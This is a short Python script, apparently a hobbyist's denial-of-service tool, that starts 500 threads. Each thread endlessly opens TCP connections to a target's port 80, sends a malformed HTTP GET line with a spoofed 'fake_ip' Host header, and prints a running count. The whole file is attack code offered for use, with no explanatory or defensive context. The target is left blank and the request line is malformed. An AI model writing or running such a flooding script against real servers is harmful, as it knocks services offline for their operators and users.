#leighTrinity
#Dec 29 2021

import threading
import socket

target =''
port = 80
fake_ip ='182.22.22.31'

alreadyconnected= 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(("GET/" + target + " HTTP/1.1\r\n").encode('ascii')), (target, port)
        s.sendto(("Host: " + fake_ip+ "\r\n\r\n").encode('ascii'), (target,port))
        s.close()

        global alreadyconnected
        alreadyconnected += 1
        print(alreadyconnected)

for i in range(500):
    thread= threading.Thread(target=attack)
    thread.start()

